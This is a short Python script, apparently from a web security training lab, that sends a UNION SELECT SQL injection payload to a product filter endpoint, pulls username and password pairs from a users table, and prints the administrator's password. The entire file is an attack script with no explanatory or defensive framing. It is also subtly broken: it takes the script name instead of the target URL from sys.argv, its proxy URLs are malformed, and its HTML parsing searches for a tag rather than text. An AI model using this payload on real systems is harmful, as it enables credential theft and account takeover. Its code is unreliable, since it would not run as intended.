import sys
import urllib3
import requests
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies= {'http':'http:127.0.0.1:8080',
          'https': 'http:127.0.0.1:8080'}
headers= {'user-agent':'Mozilla/5.0'}
def exploit_sqli(url):
    path='/filter?category=Gifts'
    payload= " 'UNION+SELECT+NULL+username||'~'||password+from+users-- "
    r= requests.get(url+path+payload,headers=headers,proxies=proxies,verify=False)
    res = r.text
    if 'administrator' in res:
        parse=BeautifulSoup(res,'html.parser')
        admin_password = parse.find(name='administrator').parent.findNext('td').contents[0]
        print(f"the admin pass is {admin_password}")
        return True
    else:
        return False
if __name__ == "__main__":
    try:
        url = sys.argv[0]
    except IndexError:
        print("Usage: python3 script.py <URL> <payload>")
    if exploit_sqli(url):
        print("The sqli is successfull")
    else:
        print("the sqli is not successfull")

